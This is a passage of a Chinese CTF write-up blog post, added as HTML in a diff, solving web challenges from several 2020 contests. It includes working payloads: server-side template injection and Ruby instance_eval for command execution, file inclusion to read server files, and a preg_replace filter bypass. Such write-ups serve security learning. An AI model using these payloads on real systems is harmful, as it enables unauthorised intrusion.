@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang=zh-TW>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="最近零零散散在各種從各種渠道參加的賽事上寫了些水題，一直在糾結到底要不要記。不過既然都做了，感覺過程中也有不少騷操作，就稍微記一記。正好也記上這些比賽裡沒寫出來的題目的復現。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="日常賽事解題記">
+<meta property="og:url" content="https://lemonprefect.cn/zh-TW/posts/24a48841.html">
+<meta property="og:site_name" content="Hexagon">
+<meta property="og:description" content="最近零零散散在各種從各種渠道參加的賽事上寫了些水題，一直在糾結到底要不要記。不過既然都做了，感覺過程中也有不少騷操作，就稍微記一記。正好也記上這些比賽裡沒寫出來的題目的復現。">
+<meta property="og:locale" content="zh_TW">
+<meta property="og:image" content="https://ae01.alicdn.com/kf/H24a98f5da04f45e2887a01b5e0d640eff.png">
+<meta property="og:image" content="https://ae01.alicdn.com/kf/H9f57bc3eb2ec46d9af14db462b6d4a94p.png">
+<meta property="og:image" content="https://ae01.alicdn.com/kf/H29783c4fda224c86816742291e422c4ei.png">
+<meta property="og:image" content="https://ae01.alicdn.com/kf/H77d23afec21d418db8da7ea3053610faz.png">
+<meta property="og:image" content="https://ae01.alicdn.com/kf/U4dcb925e60b64dd5a0f67b144894716aB.png">
+<meta property="og:image" content="https://ae01.alicdn.com/kf/Ucf1568c6275645d9b215b1d9e92a7711j.jpg">
+<meta property="article:published_time" content="2020-04-12T06:53:35.000Z">
+<meta property="article:modified_time" content="2021-04-28T08:29:34.865Z">
+<meta property="article:author" content="LemonPrefect">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ae01.alicdn.com/kf/H24a98f5da04f45e2887a01b5e0d640eff.png">
+    
+    
+      
+        
+          
+            <link rel="shortcut icon" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=48">
+          
+        
+      
+      
+        
+          
+            <link rel="icon" type="image/png" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=192">
+          
+        
+      
+      
+        
+          
+            <link rel="apple-touch-icon" size="180x180" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=180">
+          
+        
+      
+    
+    <!-- title -->
+    <title>日常賽事解題記</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexagon" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="Hexagon" type="application/rss+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/zh-TW/">首頁</a></li>
+         
+          <li><a href="/zh-TW/archives/">文章</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">關於</a></li>
+         
+          <li><a href="/search/">搜尋</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        <!-- 
+        <li><a class="icon" aria-label="上一篇 " href="/zh-CN/posts/24a48841.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/zh-CN/posts/f4f59164.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        --!>
+
+        
+          
+          
+          
+            <li><a class="icon" aria-label="中文简体（大陆标准） " href="/zh-CN/posts/24a48841.html">简</a></li>
+          
+            <li><a class="icon" aria-label="正体中文（台灣標準） " href="#">正</a></li>
+          
+        
+
+        <li><a class="icon" aria-label="回到頁首 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true"></i></a></li>
+        <li><a class="icon" aria-label="分享 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">回到頁首</span>
+      <span id="i-share" class="info" style="display:none;">分享</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-TW/posts/24a48841.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-TW/posts/24a48841.html&text=日常賽事解題記"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-TW/posts/24a48841.html&title=日常賽事解題記"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-TW/posts/24a48841.html&is_video=false&description=日常賽事解題記"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=日常賽事解題記&body=Check out this article: https://lemonprefect.cn/zh-TW/posts/24a48841.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-TW/posts/24a48841.html&title=日常賽事解題記"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-TW/posts/24a48841.html&title=日常賽事解題記"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-TW/posts/24a48841.html&title=日常賽事解題記"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-TW/posts/24a48841.html&title=日常賽事解題記"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-TW/posts/24a48841.html&name=日常賽事解題記&description=&lt;p&gt;最近零零散散在各種從各種渠道參加的賽事上寫了些水題，一直在糾結到底要不要記。不過既然都做了，感覺過程中也有不少騷操作，就稍微記一記。正好也記上這些比賽裡沒寫出來的題目的復現。&lt;/p&gt;
+&lt;p&gt;&lt;escape&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-TW/posts/24a48841.html&t=日常賽事解題記"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Dawg-CTF-2020"><span class="toc-number">1.</span> <span class="toc-text">Dawg CTF 2020</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Free-WIFI-Part-1"><span class="toc-number">1.1.</span> <span class="toc-text">Free WIFI Part 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#The-Lady-is-a-Smuggler"><span class="toc-number">1.2.</span> <span class="toc-text">The Lady is a Smuggler</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tracking"><span class="toc-number">1.3.</span> <span class="toc-text">Tracking</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Deep-CTF"><span class="toc-number">2.</span> <span class="toc-text">Deep CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Oh-JS"><span class="toc-number">2.1.</span> <span class="toc-text">Oh JS!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Magic-Word"><span class="toc-number">2.2.</span> <span class="toc-text">Magic Word!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nothing-is-Impossible"><span class="toc-number">2.3.</span> <span class="toc-text">Nothing is Impossible</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Did-You-Got-Trolled"><span class="toc-number">2.4.</span> <span class="toc-text">Did You Got Trolled?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Greetings"><span class="toc-number">2.5.</span> <span class="toc-text">Greetings!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hack-MEEEE"><span class="toc-number">2.6.</span> <span class="toc-text">Hack MEEEE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TG:Hack"><span class="toc-number">3.</span> <span class="toc-text">TG:Hack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Shop"><span class="toc-number">3.1.</span> <span class="toc-text">Shop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redux"><span class="toc-number">3.2.</span> <span class="toc-text">Redux</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AUCTF"><span class="toc-number">4.</span> <span class="toc-text">AUCTF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Miyazaki-Trivia"><span class="toc-number">4.1.</span> <span class="toc-text">Miyazaki Trivia</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Quick-Maths"><span class="toc-number">4.2.</span> <span class="toc-text">Quick Maths</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gg-no-re"><span class="toc-number">4.3.</span> <span class="toc-text">gg no re</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#API-madness"><span class="toc-number">4.4.</span> <span class="toc-text">API madness</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GWCTF-2019"><span class="toc-number">5.</span> <span class="toc-text">GWCTF 2019</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E6%9C%89%E4%B8%80%E5%80%8B%E6%95%B8%E6%93%9A%E5%BA%AB"><span class="toc-number">5.1.</span> <span class="toc-text">我有一個數據庫</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E7%8D%8E"><span class="toc-number">5.2.</span> <span class="toc-text">枯燥的抽獎</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sharky-CTF-2020"><span class="toc-number">6.</span> <span class="toc-text">Sharky CTF 2020</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XXExternalXX"><span class="toc-number">6.1.</span> <span class="toc-text">XXExternalXX</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Logs-In-Part-1"><span class="toc-number">6.2.</span> <span class="toc-text">Logs In ! Part 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Containment-Forever"><span class="toc-number">6.3.</span> <span class="toc-text">Containment Forever</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Aqua-World"><span class="toc-number">6.4.</span> <span class="toc-text">Aqua World</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        日常賽事解題記
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">LemonPrefect</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-04-12T06:53:35.000Z" itemprop="datePublished">2020-04-12</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>最近零零散散在各種從各種渠道參加的賽事上寫了些水題，一直在糾結到底要不要記。不過既然都做了，感覺過程中也有不少騷操作，就稍微記一記。正好也記上這些比賽裡沒寫出來的題目的復現。</p>
+<p><escape><span id="more"></span></escape></p>
+<hr>
+<div style="pointer-events: none">
+<h2 style="display:none" id="Dawg-CTF-2020">Dawg CTF 2020</h2>
+<img src="https://ae01.alicdn.com/kf/H24a98f5da04f45e2887a01b5e0d640eff.png"/>
+</div>
+
+<h3 id="Free-WIFI-Part-1"><a href="#Free-WIFI-Part-1" class="headerlink" title="Free WIFI Part 1"></a>Free WIFI Part 1</h3><p>附件給了個 free-wifi.pcapng，匯入到 WireShark 裡略微分析，可以發現一個請求。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    [Full request URI: http:&#x2F;&#x2F;freewifi.ctf.umbccd.io&#x2F;staff.html]</span><br><span class="line">    [HTTP request 1&#x2F;1]</span><br><span class="line">    [Response in frame: 89]</span><br><span class="line">    File Data: 134 bytes</span><br><span class="line">HTML Form URL Encoded: application&#x2F;x-www-form-urlencoded</span><br><span class="line">    Form item: &quot;csrf_token&quot; &#x3D; &quot;ImE4OGVkMWY1ZDg4YWU4MmQxMzFmODg4ZmVhMWY2MDQ0ZjUxMDA4MjAi.Xo4DYg.fnXZhEmbQPzEgFWLgEfjSTeqX2Y&quot;</span><br><span class="line">    Form item: &quot;passcode&quot; &#x3D; &quot;5004f47a&quot;</span><br><span class="line">    Form item: &quot;submit&quot; &#x3D; &quot;Submit&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>嘗試訪問 staff.html，並根據上述請求構造一個 POST 請求，就能在頁面底端拿到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DawgCTF&#123;w31c0m3_tO_d@wgs3c_!nt3rn@t!0n@1&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="The-Lady-is-a-Smuggler"><a href="#The-Lady-is-a-Smuggler" class="headerlink" title="The Lady is a Smuggler"></a>The Lady is a Smuggler</h3><p>這題一開始給了個頁面，下面有一段加密，但其實解密那段得出來的 flag 是無效的。真實的 flag 在頁面的原始碼中。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DawgCTF&#123;ClearEdge_ElizebethSmith&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Tracking"><a href="#Tracking" class="headerlink" title="Tracking"></a>Tracking</h3><p>這題頁面感覺跟前面那個一樣，首先看一手原始碼。找到一段 JavaScript。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(<span class="built_in">String</span>.fromCharCode(<span class="number">68</span>,<span class="number">97</span>,<span class="number">119</span>,<span class="number">103</span>,<span class="number">67</span>,<span class="number">84</span>,<span class="number">70</span>,<span class="number">123</span>,<span class="number">67</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">97</span>,<span class="number">114</span>, <span class="number">69</span>,<span class="number">100</span>,<span class="number">103</span>,<span class="number">101</span>,<span class="number">95</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">105</span>,<span class="number">125</span>))</span><br></pre></td></tr></table></figure>
+
+<p>放到 Console 裡面執行就得到了 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DawgCTF&#123;ClearEdge_uni&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<div style="pointer-events: none">
+<h2 style="display:none" id="Deep-CTF">Deep CTF</h2>
+<img src="https://ae01.alicdn.com/kf/H9f57bc3eb2ec46d9af14db462b6d4a94p.png"/>
+</div>
+
+<h3 id="Oh-JS"><a href="#Oh-JS" class="headerlink" title="Oh JS!"></a>Oh JS!</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #b8391a;color: #fff;font-size: 0.75rem;margin-right: 5px;">JSFuck</span></p>
+<p>這題開門見山地給了個登入的 form，但其實檢視頁面原始碼可以看到一段 JSFuck，把它掐頭去尾放到 Console 跑一下可以發現線索。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ƒ anonymous(</span><br><span class="line">) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">document</span>.forms[<span class="number">0</span>].username.value == <span class="string">&quot;corb3nik&quot;</span> &amp;&amp; <span class="built_in">document</span>.forms[<span class="number">0</span>].password.value == <span class="string">&quot;chickenachos&quot;</span>) <span class="built_in">document</span>.location = <span class="string">&quot;4d4932602a75414640946d38ea6fefbf.php&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>於是直接跳過登入的步驟，訪問 <code>.../4d4932602a75414640946d38ea6fefbf.php</code> 得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d33p&#123;g0tta_kn0w_y0ur_J4v4Scr1pt&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Magic-Word"><a href="#Magic-Word" class="headerlink" title="Magic Word!"></a>Magic Word!</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Regexp</span></p>
+<p>這題給出了頁面的原始碼和 <code>Try to reach get_mad_and_give_flag()</code> 的提示。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">require</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;magic_word&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$what_he_said</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;magic_word&#x27;</span>];</span><br><span class="line">    <span class="variable">$what_you_dont_want_to_hear</span> = <span class="string">&#x27;d33p&#x27;</span>;</span><br><span class="line">    <span class="variable">$what_you_actually_heard</span> = preg_replace(</span><br><span class="line">            <span class="string">&quot;/<span class="subst">$what_you_dont_want_to_hear</span>/&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$what_he_said</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$what_you_actually_heard</span> === <span class="variable">$what_you_dont_want_to_hear</span>) &#123;</span><br><span class="line">      get_mad_and_give_flag();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>既然是 <code>preg_replace()</code>，之前在 SQL 注入的題目裡面遇到過，只需要夾著寫一遍就行了。於是構造 <code>?magic_word=d3d33p3p</code> 得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d33p&#123;d33p_p33d&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Nothing-is-Impossible"><a href="#Nothing-is-Impossible" class="headerlink" title="Nothing is Impossible"></a>Nothing is Impossible</h3><p>這題給的是一個可以執行 php 程式碼的框，於是果斷試了一手 <code>system()</code>，發現仍然可以使用。根據題目提示，flag 在 <code>/tmp/flag.php</code>。於是直接使用 <code>od</code> 構造了 <code>system(&quot;od -A d -c /tmp/flag.php&quot;)</code>，得到結果。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0000000 &lt; ? p h p \n e c h o &quot; d 3 3 p 0000016 &#123; f 4 s t _ C G 1 _ S S R F _ p 0000032 0 w 3 r ! ! &#125; &quot; ; \n 0000042</span><br></pre></td></tr></table></figure>
+
+<p>整理之後得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d33p&#123;f4st_CG1_SSRF_p0w3r!!&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Did-You-Got-Trolled"><a href="#Did-You-Got-Trolled" class="headerlink" title="Did You Got Trolled?"></a>Did You Got Trolled?</h3><p>這題我成功地被繞了進去，他給了好多動物的叫聲，我還以為是動物園。還有那個假裝可以注入的地方，也是很好笑。其實真正的要點在找到兩個 key。在學長的提示下，我在 <code>.../css/clean-blog.css</code> 下找到了 Key1。其實他是有給提示的，只有那一個頁面引入了同樣的兩份 CSS，且重複的那份是沒有壓縮的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* </span><br><span class="line"> * What is this doing here?</span><br><span class="line"> * Key1 &#x3D; gimme0x038792</span><br><span class="line"> * </span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>接下來的那一份就得掃目錄了，是在 <code>.../robots.txt</code> 裡面有個提示，寫著 <code>Disallow /deep.php</code>。訪問這個頁面可以得到一個提示。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MAINTENANCE</span><br><span class="line">loading...</span><br><span class="line">deep.php?page&#x3D;debug.html</span><br></pre></td></tr></table></figure>
+
+<p>很容易知道這是一個檔案包含，然後再看一手頁面原始碼，可以找到 <code>&lt;!--Creds in /home/ubuntu/key2.txt --&gt;</code> 的註釋。於是構造 <code>?page=/home/ubuntu/key2.txt</code> 得到 Key2。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key2 &#x3D; flag0x085927</span><br></pre></td></tr></table></figure>
+
+<p>回到 <code>.../post.html</code> 提交兩個 Key，可以得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D33P&#123;h3r3_1s_y0ur_7r0ll_fl4g&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Greetings"><a href="#Greetings" class="headerlink" title="Greetings!"></a>Greetings!</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">SSTI</span></p>
+<p>根據題目提示，傳遞一個 GET 引數 <code>?name=you</code> 可以得到 Hello you 的反饋。於是試了一手 <code>{{7 * 7}}</code> 得到了 Hello 49 的反饋，可以確定是 SSTI 的考點，然後發現了 tornado。順勢試了下 <code>?name={{__import__("os").popen("ls").read()}}</code> 找到了 <code>flag.txt</code>。於是再構造 <code>cat flag.txt</code> 得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d33p&#123;I_&lt;3_3000&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Hack-MEEEE"><a href="#Hack-MEEEE" class="headerlink" title="Hack MEEEE"></a>Hack MEEEE</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #b8391a;color: #fff;font-size: 0.75rem;margin-right: 5px;">Ruby</span></p>
+<p>上來先看了一手這題原始碼，找到了 <code> &lt;!-- This application is made using ruby! &lt;3 --&gt;</code> 的提示，然後當時觸及到了知識盲區，就沒管。其實翻了一波手冊再查了一下之後發現很簡單。頁面請求傳遞了兩個 POST 引數。這裡有個坑，<code>method</code> 要放在前面，不然 POST 本身的換行符加上之後可能不會有正確結果返回。（報錯在頁面原始碼的註釋中可以看到）</p>
+<p>按照 Ruby 的手冊，使用 <code>method=methods</code> 和 <code>method=private_methods</code> 可以檢視當前類下包含的方法。於是找到了可以利用的反引號。<a target="_blank" rel="noopener" href="https://ruby-doc.org/core-2.2.0/Kernel.html#method-i-60">手冊參考</a>  結合上 <code>instance_eval</code> 這個方法就能達成目的。</p>
+<p>因此，構造 <code>method=instance_eval&message=`ls`</code> 的 POST 請求引數，可以得到 flag.txt 位於當前目錄下的線索，於是只需要再構造 <code>cat flag.txt</code> 即可得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d33p&#123;send_is_a_very_dangerous_method&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<div style="pointer-events: none">
+<h2 style="display:none" id="TG:Hack">TG:Hack</h2>
+<img src="https://ae01.alicdn.com/kf/H29783c4fda224c86816742291e422c4ei.png"/>
+</div>
+
+<h3 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h3><p>題目一開始，給了 bank 和 store 的兩個頁面，我們知道“襯衫的價格是九鎊十五便士”。啊，不是，是二十五美元。這題嘛，其實不能按照一般思路去想，一開始我在 bank 頁面試了好久都加不上錢，然後就只能去 store 頁面找。每買一件東西都會傳遞兩個 POST 引數，分別指代物品類別和錢數。所以，把錢數想辦法變成負數就可以從商店“索要”金錢了。但是還有一個點，使用已經存在的物品 ID 不可信，所以就隨便整個其他的 ID 就行。這裡還有一個坑，POST 引數最後的換行符會有影響（所以 HackBar 不行），我使用某線上的 POST 工具就成功達成目的了。最後就可以買到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TG20&#123;I_just_want_to_buy_a_real_flag&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Redux"><a href="#Redux" class="headerlink" title="Redux"></a>Redux</h3><p>這題，說實話我其實沒太看懂。首先隨便填一填他給的表，然後提交，Console 裡就能看到一條訊息 <code>The form has been submitted! Look at the Redux store!</code>。我一開始也想知道這個 Redux store 指的是哪裡，但是找了幾下沒找到。看到這條訊息是來自 form.js 的，於是就順手點開看了看。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> mainReducer = <span class="function">(<span class="params">state = initialState, action</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">switch</span> (action.type) &#123;</span><br><span class="line">    <span class="keyword">case</span> types.ADD_COLONIST_NUMBER:</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&quot;Payload is&quot;</span> + action.payload);</span><br><span class="line">      <span class="keyword">return</span> &#123; ...state, <span class="attr">colonist_number</span>: action.payload &#125;;</span><br><span class="line">    <span class="keyword">case</span> types.ADD_FIRST_NAME:</span><br><span class="line">      <span class="keyword">return</span> &#123; ...state, <span class="attr">firstName</span>: action.payload &#125;;</span><br><span class="line">    <span class="keyword">case</span> types.ADD_LAST_NAME:</span><br><span class="line">      <span class="keyword">return</span> &#123; ...state, <span class="attr">lastName</span>: action.payload &#125;;</span><br><span class="line">    <span class="keyword">case</span> types.ADD_FACTION:</span><br><span class="line">      <span class="keyword">return</span> &#123; ...state, <span class="attr">faction</span>: 